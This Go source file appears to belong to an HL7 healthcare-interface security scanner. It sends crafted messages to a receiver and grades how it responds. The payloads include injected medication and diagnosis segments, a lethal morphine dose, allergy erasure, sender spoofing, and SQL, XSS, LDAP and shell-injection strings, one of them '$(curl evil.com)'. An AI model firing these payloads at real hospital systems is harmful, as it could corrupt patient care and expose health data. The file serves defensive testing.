// advanced_tests.go — Tests for the top HL7 security risks based on
// documented real-world attacks (Black Hat 2018, ERNW 2020, TXOne 2026,
// SANS/GIAC research) and HIPAA Technical Safeguard requirements.
package security

import (
	"fmt"
	"strings"
	"time"

	"github.com/hl7-security-tester/pkg/hl7"
	"github.com/hl7-security-tester/pkg/transport"
)

// ─────────────────────────────────────────────────────────────────────────────
// RISK 1: SEGMENT INJECTION
// Documented at Black Hat 2018 ("Pestilential Protocol") and ERNW 2020.
// Attacker embeds \r characters into field values to inject rogue HL7 segments.
// A vulnerable receiver processes the injected segments as legitimate data.
// ─────────────────────────────────────────────────────────────────────────────

// TestSegmentInjection sends messages where field values contain embedded
// \r characters followed by fake HL7 segments. A secure receiver must either
// reject the message or strip/escape the injected content.
func (r *Runner) TestSegmentInjection() []Finding {
	var findings []Finding

	if len(r.messages) == 0 {
		return []Finding{{
			TestName:  "SegmentInjection",
			Severity:  Info,
			Timestamp: time.Now(),
			Description: "No messages available for segment injection test",
		}}
	}

	base, _ := hl7.Parse(r.messages[0])
	if base == nil {
		return findings
	}

	// Build a base MSH for injected messages
	now := time.Now().Format("20060102150405")

	cases := []struct {
		name    string
		payload string
		desc    string
	}{
		{
			"SegInject-RXE",
			// Inject a fake medication order segment via PID patient name field
			fmt.Sprintf(
				"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|INJTEST001|P|2.5\rPID|1||MRN00001^^^HOSP||"+
					"DOE\\rRXE|1|MORPHINE^MORPHINE 100MG^NDC|100|MG||||||||||||||||||||||||\r",
				now),
			"Inject RXE medication order via PID name field using \\r",
		},
		{
			"SegInject-DG1",
			// Inject a fake diagnosis via OBX value field
			fmt.Sprintf(
				"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ORU^R01|INJTEST002|P|2.5\rPID|1||MRN00002^^^HOSP||SMITH^JANE\r"+
					"OBX|1|ST|RESULT||NORMAL\\rDG1|1||C80.9^MALIGNANT NEOPLASM^ICD10|||BD\r",
				now),
			"Inject DG1 diagnosis via OBX value field using \\r",
		},
		{
			"SegInject-MSH",
			// Attempt to inject a second MSH to override message type
			fmt.Sprintf(
				"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|INJTEST003|P|2.5\rPID|1||MRN00003^^^HOSP||"+
					"TEST^PATIENT\\rMSH|^~\\&|ATTACKER|EVIL|RECV|FAC|%s||ORM^O01|INJTEST003B|P|2.5\r",
				now, now),
			"Inject second MSH to override message type",
		},
		{
			"SegInject-ZSG",
			// Z-segment injection — some receivers process custom Z-segments with elevated trust
			fmt.Sprintf(
				"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|INJTEST004|P|2.5\rPID|1||MRN00004^^^HOSP||"+
					"JONES^BOB\\rZAD|ADMIN|GRANT|ALL_ACCESS|NO_AUDIT\r",
				now),
			"Inject Z-segment (ZAD) privilege escalation attempt via PID name",
		},
	}

	for _, tc := range cases {
		f := Finding{TestName: tc.name, Timestamp: time.Now(), Description: tc.desc}
		r.logf("[SEGMENT-INJECT] Testing: %s", tc.desc)

		client, err := transport.Dial(r.cfg)
		if err != nil {
			f.Severity = Info
			f.Description = "Connection failed: " + tc.desc
			f.Detail = err.Error()
			findings = append(findings, f)
			continue
		}

		respRaw, dur, sendErr := client.Send(tc.payload)
		client.Close()
		r.logf("[SEGMENT-INJECT] Response time: %s", dur.Round(time.Millisecond))

		if sendErr != nil {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Server rejected segment injection attempt: %s", tc.desc)
			f.Detail = fmt.Sprintf("Connection closed: %v", sendErr)
		} else {
			respStr, _ := hl7.UnwrapMLLP(respRaw)
			ackCode := extractACKCode(respStr)
			if ackCode == "AE" || ackCode == "AR" {
				f.Passed = true
				f.Severity = Pass
				f.Description = fmt.Sprintf("Server rejected injected message with %s: %s", ackCode, tc.desc)
				f.Detail = fmt.Sprintf("ACK=%s — Server validated input correctly", ackCode)
			} else if ackCode == "AA" {
				f.Passed = false
				f.Severity = Critical
				f.Description = fmt.Sprintf("Server ACCEPTED message with injected segment: %s", tc.desc)
				f.Detail = fmt.Sprintf(
					"ACK=AA — Receiver did not detect embedded \\r segment injection. "+
						"Attacker could inject medication orders (RXE), diagnoses (DG1), "+
						"or override message routing. Documented attack vector from Black Hat 2018.",
				)
			} else {
				f.Passed = false
				f.Severity = Medium
				f.Description = fmt.Sprintf("Inconclusive response to segment injection: %s", tc.desc)
				f.Detail = fmt.Sprintf("ACK=%q", ackCode)
			}
		}
		findings = append(findings, f)
	}
	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 2: FIELD TAMPERING / DATA INTEGRITY
// HL7 v2 has no native message signing or integrity verification.
// Attacker can modify critical fields (dosage, allergy, lab result) in transit.
// This test checks whether the receiver detects field-level tampering.
// ─────────────────────────────────────────────────────────────────────────────

// TestFieldTampering sends messages with clearly anomalous field values
// to see if the receiver has any range/sanity checking on critical data.
func (r *Runner) TestFieldTampering() []Finding {
	var findings []Finding

	if len(r.messages) == 0 {
		return []Finding{{
			TestName: "FieldTampering", Severity: Info,
			Description: "No messages for field tampering test", Timestamp: time.Now(),
		}}
	}

	now := time.Now().Format("20060102150405")

	cases := []struct {
		name    string
		msg     string
		desc    string
		severity Severity
	}{
		{
			"Tamper-DOB-Future",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|TAMP001|P|2.5\rPID|1||MRN00001^^^HOSP||DOE^JOHN||29990101|M\r", now),
			"Patient DOB set to year 2999 (impossible future date)",
			Medium,
		},
		{
			"Tamper-OBX-ExtremeValue",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ORU^R01|TAMP002|P|2.5\rPID|1||MRN00002^^^HOSP||DOE^JOHN\rOBX|1|NM|WBC^WHITE BLOOD COUNT||999999|10*3/uL|4.5-11.0|H|||F\r", now),
			"OBX lab result set to 999999 (physiologically impossible WBC count)",
			High,
		},
		{
			"Tamper-RXE-MassiveDose",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||RDE^O11|TAMP003|P|2.5\rPID|1||MRN00003^^^HOSP||DOE^JOHN\rORC|NW|ORD99999\rRXE|1|MORPHINE^MORPHINE SULFATE|99999|MG|||IV|STAT\r", now),
			"RXE medication dose set to 99999mg (lethal overdose level)",
			Critical,
		},
		{
			"Tamper-Allergy-Removed",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|TAMP004|P|2.5\rPID|1||MRN00004^^^HOSP||DOE^JOHN\rAL1|1|DA|PENICILLIN^PENICILLIN||ANAPHYLAXIS\rAL1|1|DA||||\r", now),
			"AL1 allergy segment sent with empty allergy code (potential allergy erasure)",
			High,
		},
		{
			"Tamper-NegativeAge",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|TAMP005|P|2.5\rPID|1||MRN00005^^^HOSP||DOE^JOHN||20991231|M\r", now),
			"Patient DOB in far future produces negative age — boundary check",
			Medium,
		},
	}

	for _, tc := range cases {
		f := Finding{TestName: tc.name, Timestamp: time.Now(), Severity: tc.severity}
		r.logf("[TAMPER] Testing: %s", tc.desc)

		client, err := transport.Dial(r.cfg)
		if err != nil {
			f.Severity = Info
			f.Description = "Connection failed"
			f.Detail = err.Error()
			findings = append(findings, f)
			continue
		}

		respRaw, _, sendErr := client.Send(tc.msg)
		client.Close()

		if sendErr != nil {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Server rejected tampered message: %s", tc.desc)
			findings = append(findings, f)
			continue
		}

		respStr, _ := hl7.UnwrapMLLP(respRaw)
		ackCode := extractACKCode(respStr)

		if ackCode == "AE" || ackCode == "AR" {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Server rejected tampered data: %s", tc.desc)
			f.Detail = fmt.Sprintf("ACK=%s — Receiver validated field values", ackCode)
		} else {
			f.Passed = false
			f.Description = fmt.Sprintf("Server accepted tampered data: %s", tc.desc)
			f.Detail = fmt.Sprintf(
				"ACK=%s — No data validation detected. %s",
				ackCode, tc.desc,
			)
		}
		findings = append(findings, f)
	}
	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 3: SQL / COMMAND INJECTION VIA HL7 FIELDS
// Many HL7 receivers write message data to SQL databases without sanitisation.
// Patient name, MRN, and free-text fields are common injection vectors.
// ─────────────────────────────────────────────────────────────────────────────

// TestInjectionAttacks sends HL7 messages with SQL, shell, and script
// injection payloads in patient-facing fields to check receiver sanitisation.
func (r *Runner) TestInjectionAttacks() []Finding {
	var findings []Finding
	now := time.Now().Format("20060102150405")

	cases := []struct {
		name    string
		field   string // which field the payload goes in
		payload string // the full raw message
		desc    string
	}{
		{
			"SQLInject-PIDName",
			"PID-5 (patient name)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|SQLI001|P|2.5\rPID|1||MRN99901^^^HOSP||'; DROP TABLE PATIENTS; --^INJECT\r", now),
			"SQL DROP TABLE in patient name (PID-5)",
		},
		{
			"SQLInject-MRN",
			"PID-3 (MRN)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|SQLI002|P|2.5\rPID|1||' OR '1'='1^^^HOSP||DOE^JOHN\r", now),
			"SQL OR-injection in MRN (PID-3)",
		},
		{
			"SQLInject-OBXValue",
			"OBX-5 (observation value)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ORU^R01|SQLI003|P|2.5\rPID|1||MRN99903^^^HOSP||DOE^JOHN\rOBX|1|ST|NOTE||' UNION SELECT username,password FROM users--\r", now),
			"SQL UNION SELECT in OBX observation value",
		},
		{
			"SQLInject-NTE",
			"NTE-3 (notes)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|SQLI004|P|2.5\rPID|1||MRN99904^^^HOSP||DOE^JOHN\rNTE|1|L|'; EXEC xp_cmdshell('whoami'); --\r", now),
			"SQL Server xp_cmdshell in NTE notes field",
		},
		{
			"CmdInject-ShellField",
			"MSH-3 (sending app)",
			fmt.Sprintf("MSH|^~\\&|$(curl evil.com)|FAC|RECV|FAC|%s||ADT^A01|CMDI001|P|2.5\rPID|1||MRN99905^^^HOSP||DOE^JOHN\r", now),
			"Shell command substitution in MSH-3 sending app",
		},
		{
			"ScriptInject-PIDName",
			"PID-5 (patient name)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|XSSI001|P|2.5\rPID|1||MRN99906^^^HOSP||<script>alert(1)</script>^INJECT\r", now),
			"XSS script tag in patient name (targets web-based viewers)",
		},
		{
			"LDAPInjection-PIDName",
			"PID-5 (patient name)",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|LDAP001|P|2.5\rPID|1||MRN99907^^^HOSP||*)(uid=*))(|(uid=*^INJECT\r", now),
			"LDAP injection payload in patient name field",
		},
	}

	for _, tc := range cases {
		f := Finding{TestName: tc.name, Timestamp: time.Now()}
		r.logf("[INJECT] Testing: %s", tc.desc)

		client, err := transport.Dial(r.cfg)
		if err != nil {
			f.Severity = Info
			f.Description = "Connection failed"
			f.Detail = err.Error()
			findings = append(findings, f)
			continue
		}

		respRaw, _, sendErr := client.Send(tc.payload)
		client.Close()

		if sendErr != nil {
			// Connection closed is not necessarily a pass — we can't tell if payload was processed
			f.Passed = false
			f.Severity = Medium
			f.Description = fmt.Sprintf("Connection closed during injection test — inconclusive: %s", tc.desc)
			f.Detail = fmt.Sprintf("Cannot confirm whether payload was sanitised before processing: %v", sendErr)
			findings = append(findings, f)
			continue
		}

		respStr, _ := hl7.UnwrapMLLP(respRaw)
		ackCode := extractACKCode(respStr)

		// Check if the server echoes the injection payload in its error response
		injectionEchoed := containsInjectionSignals(respStr)

		if injectionEchoed {
			f.Passed = false
			f.Severity = Critical
			f.Description = fmt.Sprintf("Server echoed injection payload in response: %s", tc.desc)
			f.Detail = "SQL/script/command payload was reflected in the ACK — receiver may be processing unsanitised input"
		} else if ackCode == "AE" || ackCode == "AR" {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Server rejected injection payload: %s", tc.desc)
			f.Detail = fmt.Sprintf("ACK=%s — Field validation appears active", ackCode)
		} else if ackCode == "AA" {
			f.Passed = false
			f.Severity = High
			f.Description = fmt.Sprintf("Server accepted message with injection payload in %s", tc.field)
			f.Detail = fmt.Sprintf(
				"ACK=AA — Payload accepted without rejection: %s. "+
					"If this field is written to a database or displayed in a UI without "+
					"sanitisation, SQL/command/script injection may be possible.",
				tc.desc,
			)
		} else {
			f.Passed = false
			f.Severity = Medium
			f.Description = fmt.Sprintf("Inconclusive injection test: %s", tc.desc)
			f.Detail = fmt.Sprintf("ACK=%q", ackCode)
		}
		findings = append(findings, f)
	}
	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 4: UNAUTHORIZED SENDER / MESSAGE SPOOFING
// HL7 v2 has no native source authentication.
// Any machine on the network can claim to be any sending application.
// This tests whether the receiver validates MSH-3/4 identity.
// ─────────────────────────────────────────────────────────────────────────────

// TestUnauthorizedSender tries to send messages claiming to be from
// known trusted internal systems (HIS, LIS, PHARMACY) to see if the
// receiver accepts messages from unauthorised senders.
func (r *Runner) TestUnauthorizedSender() []Finding {
	var findings []Finding
	now := time.Now().Format("20060102150405")

	// Common trusted application names used in hospital environments
	spoofedIdentities := []struct {
		app string
		fac string
	}{
		{"HIS", "HOSPITAL"},
		{"ADT", "MAINHOSP"},
		{"LIS", "LAB"},
		{"PHARMACY", "PHARM"},
		{"EHR", "CLINIC"},
		{"ADMIN", "INTERNAL"},
		{"SUPERUSER", "SYSTEM"},
		{"ROOT", "LOCALHOST"},
	}

	var accepted, rejected int

	for _, identity := range spoofedIdentities {
		msg := fmt.Sprintf(
			"MSH|^~\\&|%s|%s|RECV|FAC|%s||ADT^A01|SPOOF%d|P|2.5\rPID|1||MRN00001^^^HOSP||DOE^JOHN||19800515|M\r",
			identity.app, identity.fac, now, time.Now().UnixNano(),
		)

		client, err := transport.Dial(r.cfg)
		if err != nil {
			continue
		}
		respRaw, _, sendErr := client.Send(msg)
		client.Close()

		if sendErr != nil {
			rejected++
			continue
		}
		respStr, _ := hl7.UnwrapMLLP(respRaw)
		ackCode := extractACKCode(respStr)
		if ackCode == "AA" {
			accepted++
			r.logf("[SPOOF] Accepted message from spoofed identity: %s|%s", identity.app, identity.fac)
		} else {
			rejected++
		}
	}

	f := Finding{TestName: "UnauthorizedSender", Timestamp: time.Now()}
	total := len(spoofedIdentities)

	if accepted == 0 {
		f.Passed = true
		f.Severity = Pass
		f.Description = "Server rejected all spoofed sender identities"
		f.Detail = fmt.Sprintf("0/%d spoofed MSH-3/4 identities accepted", total)
	} else if accepted == total {
		f.Passed = false
		f.Severity = Critical
		f.Description = "Server accepts messages from ANY sender — no MSH authentication"
		f.Detail = fmt.Sprintf(
			"%d/%d spoofed identities accepted (HIS, LIS, PHARMACY, ADMIN, ROOT, etc). "+
				"Any machine on the network can send HL7 as a trusted system. "+
				"This is the most common HL7 vulnerability — MLLP has no built-in sender authentication.",
			accepted, total,
		)
	} else {
		f.Passed = false
		f.Severity = High
		f.Description = fmt.Sprintf("Server accepted %d/%d spoofed sender identities", accepted, total)
		f.Detail = fmt.Sprintf(
			"Partial sender filtering detected but %d identities were accepted. "+
				"An attacker may be able to find additional accepted identities by brute force.",
			accepted,
		)
	}
	return append(findings, f)
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 5: PATIENT RECORD ENUMERATION
// Sending messages with sequential/guessed MRNs to enumerate valid patients.
// A secure system should rate-limit, not reveal whether an MRN exists,
// and not return patient details in error messages.
// ─────────────────────────────────────────────────────────────────────────────

// TestPatientEnumeration sends QRY^A19 patient query messages with
// sequential MRNs to check if the receiver reveals patient existence
// through different response codes or error message content.
func (r *Runner) TestPatientEnumeration() []Finding {
	var findings []Finding
	now := time.Now().Format("20060102150405")

	r.logf("[ENUM] Testing patient MRN enumeration via QRY^A19...")

	// Test 5 sequential MRNs — look for differential responses
	type enumResult struct {
		mrn     string
		ackCode string
		errText string
		hasData bool
	}

	var results []enumResult
	mrns := []string{"MRN00001", "MRN99999", "000001", "999999", "INVALID_MRN"}

	for _, mrn := range mrns {
		// QRY^A19 is the standard patient query message type
		msg := fmt.Sprintf(
			"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||QRY^A19|ENUM%d|P|2.5\rQRD|%s|R|I|ENUM|||1^RD|%s|DEM\r",
			now, time.Now().UnixNano()%10000, now, mrn,
		)

		client, err := transport.Dial(r.cfg)
		if err != nil {
			continue
		}
		respRaw, _, sendErr := client.Send(msg)
		client.Close()

		result := enumResult{mrn: mrn}
		if sendErr == nil {
			respStr, _ := hl7.UnwrapMLLP(respRaw)
			result.ackCode = extractACKCode(respStr)
			result.errText = extractMSAText(respStr)
			// Check if response contains patient data (PID segment in response)
			result.hasData = strings.Contains(respStr, "PID|") || strings.Contains(respStr, "PID |")
		}
		results = append(results, result)
		time.Sleep(200 * time.Millisecond)
	}

	// Analyse results for differential responses
	ackCodes := map[string]int{}
	patientDataLeaked := false
	for _, res := range results {
		ackCodes[res.ackCode]++
		if res.hasData {
			patientDataLeaked = true
		}
	}

	// Finding 1: Patient data in query response
	dataF := Finding{TestName: "Enum-DataLeak", Timestamp: time.Now()}
	if patientDataLeaked {
		dataF.Passed = false
		dataF.Severity = Critical
		dataF.Description = "Server returned patient PID data in response to unauthenticated query"
		dataF.Detail = "QRY^A19 query returned PID segments without authentication. Patient records are enumerable."
	} else {
		dataF.Passed = true
		dataF.Severity = Pass
		dataF.Description = "Server did not return patient data to unauthenticated queries"
	}
	findings = append(findings, dataF)

	// Finding 2: Differential responses reveal MRN validity
	diffF := Finding{TestName: "Enum-DifferentialResponse", Timestamp: time.Now()}
	if len(ackCodes) > 1 {
		diffF.Passed = false
		diffF.Severity = Medium
		diffF.Description = "Server returns different ACK codes for different MRNs — MRN existence may be detectable"
		diffF.Detail = fmt.Sprintf(
			"Different ACK codes observed across MRN queries: %v. "+
				"An attacker can use response differences to determine which MRNs exist "+
				"(oracle attack / patient enumeration).",
			ackCodes,
		)
	} else {
		diffF.Passed = true
		diffF.Severity = Pass
		diffF.Description = "Server returns consistent responses regardless of MRN validity"
		diffF.Detail = "No differential response detected — MRN enumeration not possible via ACK code"
	}
	findings = append(findings, diffF)

	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 6: SENSITIVE DATA IN ERROR RESPONSES
// Some HL7 receivers echo patient data, stack traces, DB connection strings,
// or internal path information in MSA-3 (error text) or ERR segments.
// ─────────────────────────────────────────────────────────────────────────────

// TestErrorMessageLeakage sends intentionally broken messages and inspects
// the NACK/error response for leaked internal information.
func (r *Runner) TestErrorMessageLeakage() []Finding {
	var findings []Finding
	now := time.Now().Format("20060102150405")

	r.logf("[ERRLEAKAGE] Testing error message information disclosure...")

	errorTriggers := []struct {
		name string
		msg  string
		desc string
	}{
		{
			"ErrLeak-InvalidMsgType",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ZZZ^Z99|ERR001|P|2.5\rPID|1||MRN00001^^^HOSP||DOE^JOHN\r", now),
			"Invalid message type ZZZ^Z99",
		},
		{
			"ErrLeak-MalformedPID",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|ERR002|P|2.5\rPID|1||%s\r", now, strings.Repeat("X", 5000)),
			"Extremely long PID field (5000 chars)",
		},
		{
			"ErrLeak-InvalidVersion",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|ERR003|P|9.9\rPID|1||MRN00001^^^HOSP||DOE^JOHN\r", now),
			"Invalid HL7 version 9.9",
		},
		{
			"ErrLeak-NullMRN",
			fmt.Sprintf("MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|ERR004|P|2.5\rPID|1||\"\"\r", now),
			"Null/empty MRN to trigger lookup error",
		},
	}

	for _, tc := range errorTriggers {
		f := Finding{TestName: tc.name, Timestamp: time.Now()}

		client, err := transport.Dial(r.cfg)
		if err != nil {
			f.Severity = Info
			f.Description = "Connection failed"
			f.Detail = err.Error()
			findings = append(findings, f)
			continue
		}

		respRaw, _, sendErr := client.Send(tc.msg)
		client.Close()

		if sendErr != nil {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Server closed connection on error trigger: %s", tc.desc)
			findings = append(findings, f)
			continue
		}

		respStr, _ := hl7.UnwrapMLLP(respRaw)
		leaked := detectInfoLeakage(respStr)

		if len(leaked) > 0 {
			f.Passed = false
			f.Severity = High
			f.Description = fmt.Sprintf("Error response leaks internal information: %s", tc.desc)
			f.Detail = fmt.Sprintf(
				"Leaked indicators in error response: %s. "+
					"Stack traces, DB errors, or file paths in ACK error text can reveal system architecture.",
				strings.Join(leaked, ", "),
			)
		} else {
			f.Passed = true
			f.Severity = Pass
			f.Description = fmt.Sprintf("Error response does not leak internal information: %s", tc.desc)
			f.Detail = fmt.Sprintf("ACK=%s, no internal details detected in error text", extractACKCode(respStr))
		}
		findings = append(findings, f)
	}
	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 7: MISSING AUDIT TRAIL DETECTION
// HIPAA requires audit logging of all HL7 transactions.
// We can detect weak auditing by checking whether the receiver accepts
// messages with duplicate IDs silently (no duplicate detection = no log check).
// ─────────────────────────────────────────────────────────────────────────────

// TestAuditTrailWeakness probes for signs of missing or weak audit logging
// by sending high-volume bursts and checking for consistent response behaviour.
func (r *Runner) TestAuditTrailWeakness() []Finding {
	var findings []Finding

	if len(r.messages) == 0 {
		return []Finding{{
			TestName:    "AuditTrail",
			Severity:    Info,
			Description: "No messages for audit trail test",
			Timestamp:   time.Now(),
		}}
	}

	r.logf("[AUDIT] Testing audit trail consistency with rapid burst...")

	// Send 10 rapid messages with sequential IDs — consistent ACK timing
	// and no throttling suggests no per-message audit write is occurring.
	const burstSize = 10
	var responseTimes []time.Duration
	var accepted int

	now := time.Now().Format("20060102150405")
	for i := 0; i < burstSize; i++ {
		msgID := fmt.Sprintf("AUDIT%05d", i)
		msg := fmt.Sprintf(
			"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ADT^A01|%s|P|2.5\rPID|1||MRN%05d^^^HOSP||DOE^JOHN||19800515|M\r",
			now, msgID, i,
		)
		client, err := transport.Dial(r.cfg)
		if err != nil {
			continue
		}
		respRaw, dur, sendErr := client.Send(msg)
		client.Close()
		if sendErr == nil {
			responseTimes = append(responseTimes, dur)
			respStr, _ := hl7.UnwrapMLLP(respRaw)
			if extractACKCode(respStr) == "AA" {
				accepted++
			}
		}
		time.Sleep(50 * time.Millisecond)
	}

	// Analyse timing — if all responses are suspiciously fast and uniform,
	// the receiver may not be persisting an audit log per message.
	auditF := Finding{TestName: "AuditTrail-Timing", Timestamp: time.Now()}

	if len(responseTimes) < 3 {
		auditF.Severity = Info
		auditF.Description = "Insufficient responses to analyse audit trail timing"
		findings = append(findings, auditF)
	} else {
		avgMs := avgDurationMs(responseTimes)
		maxMs := maxDurationMs(responseTimes)
		minMs := minDurationMs(responseTimes)
		variance := maxMs - minMs

		if avgMs < 5 && variance < 3 {
			auditF.Passed = false
			auditF.Severity = Medium
			auditF.Description = "Response times suspiciously uniform and fast — audit logging may not be persisting per message"
			auditF.Detail = fmt.Sprintf(
				"Avg=%.1fms, Min=%.1fms, Max=%.1fms, Variance=%.1fms. "+
					"Extremely fast uniform responses across %d messages may indicate no synchronous audit write. "+
					"HIPAA requires a complete audit log of all HL7 transactions.",
				avgMs, minMs, maxMs, variance, burstSize,
			)
		} else {
			auditF.Passed = true
			auditF.Severity = Pass
			auditF.Description = "Response timing suggests per-message processing (audit logging likely active)"
			auditF.Detail = fmt.Sprintf("Avg=%.1fms, Variance=%.1fms across %d messages", avgMs, variance, burstSize)
		}
	}
	findings = append(findings, auditF)

	// Duplicate ID acceptance also implies no audit cross-check
	dupF := Finding{TestName: "AuditTrail-DuplicateID", Timestamp: time.Now()}
	if accepted == burstSize {
		dupF.Passed = false
		dupF.Severity = Medium
		dupF.Description = "All burst messages accepted — no per-message audit cross-check detected"
		dupF.Detail = fmt.Sprintf(
			"%d/%d rapid messages accepted with unique IDs. "+
				"A system with proper audit logging typically cross-checks incoming IDs "+
				"against the log to detect anomalous burst patterns.",
			accepted, burstSize,
		)
	} else {
		dupF.Passed = true
		dupF.Severity = Pass
		dupF.Description = "Server throttled or rejected some burst messages"
		dupF.Detail = fmt.Sprintf("%d/%d accepted during burst", accepted, burstSize)
	}
	findings = append(findings, dupF)

	return findings
}

// ─────────────────────────────────────────────────────────────────────────────
// RISK 8: UNENCRYPTED ACK LEAKS PHI
// Even when a message is rejected, some systems echo patient identifiers
// back in the ACK's MSA-3 error text or ERR segment — in plaintext.
// This test is distinct from the existing PHIInACK test: it specifically
// checks NACKs (rejected messages), not successful ACKs.
// ─────────────────────────────────────────────────────────────────────────────

// TestNACKPHILeakage sends a message with distinctive PHI values and
// triggers a rejection to check if the NACK echoes the PHI.
func (r *Runner) TestNACKPHILeakage() []Finding {
	var findings []Finding
	now := time.Now().Format("20060102150405")

	// Use a distinctive fake SSN and name that would be unmistakable if echoed
	distinctiveSSN := "987-65-4320"
	distinctiveName := "XYZTEST^CANARY^Q"
	distinctiveMRN := "CANARY99999"

	// Send a valid-looking message with distinctive PHI, then trigger a NACK
	// by using an invalid message type so the PHI is visible in the rejection
	msg := fmt.Sprintf(
		"MSH|^~\\&|SEND|FAC|RECV|FAC|%s||ZZZ^Z01|NACK001|P|2.5\r"+
			"PID|1||%s^^^HOSP||%s||19800515|M|||123 TEST ST^^TESTCITY^TS^99999||5555559999|||S||%s\r",
		now, distinctiveMRN, distinctiveName, strings.ReplaceAll(distinctiveSSN, "-", ""),
	)

	r.logf("[NACK-PHI] Testing PHI leakage in NACK responses...")

	client, err := transport.Dial(r.cfg)
	if err != nil {
		return []Finding{{
			TestName:    "NACKPHILeak",
			Severity:    Info,
			Description: "Connection failed",
			Detail:      err.Error(),
			Timestamp:   time.Now(),
		}}
	}

	respRaw, _, sendErr := client.Send(msg)
	client.Close()

	f := Finding{TestName: "NACKPHILeak", Timestamp: time.Now()}

	if sendErr != nil {
		f.Passed = true
		f.Severity = Pass
		f.Description = "Server closed connection without sending NACK — no PHI exposure"
		return append(findings, f)
	}

	respStr, _ := hl7.UnwrapMLLP(respRaw)
	ackCode := extractACKCode(respStr)

	var leaked []string
	if strings.Contains(respStr, distinctiveMRN) {
		leaked = append(leaked, "MRN ("+distinctiveMRN+")")
	}
	if strings.Contains(respStr, "XYZTEST") || strings.Contains(respStr, "CANARY") {
		leaked = append(leaked, "Patient name")
	}
	if strings.Contains(respStr, "987654320") || strings.Contains(respStr, "987-65-4320") {
		leaked = append(leaked, "SSN")
	}

	if len(leaked) > 0 {
		f.Passed = false
		f.Severity = High
		f.Description = "NACK response echoes patient PHI — data exposed even on rejected messages"
		f.Detail = fmt.Sprintf(
			"ACK=%s. Leaked fields in NACK: %s. "+
				"PHI is exposed in error responses even when the message is rejected. "+
				"If the channel is unencrypted, an eavesdropper sees patient data from both "+
				"successful and failed transactions.",
			ackCode, strings.Join(leaked, ", "),
		)
	} else {
		f.Passed = true
		f.Severity = Pass
		f.Description = "NACK response does not echo patient PHI"
		f.Detail = fmt.Sprintf("ACK=%s, no patient identifiers detected in error response", ackCode)
	}
	return append(findings, f)
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers specific to advanced tests
// ─────────────────────────────────────────────────────────────────────────────

// containsInjectionSignals checks if a response reflects SQL/script payloads.
func containsInjectionSignals(response string) bool {
	signals := []string{
		"DROP TABLE", "UNION SELECT", "xp_cmdshell",
		"<script>", "alert(", "ORA-", "MySQL",
		"SQLSTATE", "syntax error", "SQLException",
		"Unclosed quotation", "unterminated",
	}
	upper := strings.ToUpper(response)
	for _, sig := range signals {
		if strings.Contains(upper, strings.ToUpper(sig)) {
			return true
		}
	}
	return false
}

// detectInfoLeakage checks ACK/NACK error text for internal system information.
func detectInfoLeakage(response string) []string {
	var found []string
	indicators := map[string]string{
		"Exception":          "exception/stack trace",
		"StackTrace":         "stack trace",
		"NullReference":      "null reference exception",
		"SQLException":       "SQL exception",
		"ORA-":               "Oracle DB error",
		"SQLSTATE":           "SQL state error",
		"at System.":         ".NET stack trace",
		"at org.":            "Java stack trace",
		"C:\\":               "Windows file path",
		"/var/":              "Unix file path",
		"/home/":             "Unix home path",
		"connectionString":   "DB connection string",
		"password=":          "password in error",
		"Data Source=":       "DB data source",
		"Server=":            "DB server name",
		"Microsoft OLE DB":   "OLE DB error",
		"Internal Server":    "internal server error",
		"Unhandled":          "unhandled exception",
	}
	for indicator, desc := range indicators {
		if strings.Contains(response, indicator) {
			found = append(found, desc)
		}
	}
	return found
}

// extractMSAText returns the MSA-3 error text from a response.
func extractMSAText(response string) string {
	for _, line := range strings.Split(response, "\r") {
		if strings.HasPrefix(line, "MSA|") {
			parts := strings.Split(line, "|")
			if len(parts) > 3 {
				return parts[3]
			}
		}
	}
	return ""
}

func avgDurationMs(durations []time.Duration) float64 {
	if len(durations) == 0 {
		return 0
	}
	var total float64
	for _, d := range durations {
		total += float64(d.Milliseconds())
	}
	return total / float64(len(durations))
}

func maxDurationMs(durations []time.Duration) float64 {
	var max float64
	for _, d := range durations {
		if ms := float64(d.Milliseconds()); ms > max {
			max = ms
		}
	}
	return max
}

func minDurationMs(durations []time.Duration) float64 {
	if len(durations) == 0 {
		return 0
	}
